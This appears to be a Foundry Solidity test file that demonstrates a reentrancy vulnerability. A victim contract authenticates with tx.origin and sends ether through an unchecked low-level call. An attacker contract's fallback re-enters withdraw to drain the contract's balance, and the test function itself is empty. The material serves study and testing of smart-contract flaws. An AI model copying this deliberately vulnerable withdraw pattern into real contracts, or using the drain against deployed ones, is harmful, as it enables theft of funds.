// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract ContractTest is Test {
    Contract ctr;
    Attacker attacker;

    function setUp() public {
        ctr = new Contract();
        vm.deal(address(ctr), 100);

        attacker = new Attacker(address(ctr));

        ctr.withdraw(address(attacker), 10);
    }

    function testVuln() public {}
}

contract Contract is Test {
    address public owner;

    constructor() {
        owner = tx.origin;
    }

    function withdraw(address to, uint256 amount) public {
        require(tx.origin == owner, "no");
        console.log("entry");
        (bool success, ) = to.call{value: amount}("");
    }
}

contract Attacker is Test {
    Contract ctr;
    address attacker;

    constructor(address _ctr) {
        ctr = Contract(_ctr);
        attacker = msg.sender;
    }

    fallback() external payable {
        if (msg.sender.balance == 0) return;
        ctr.withdraw(address(this), msg.sender.balance);
    }
}
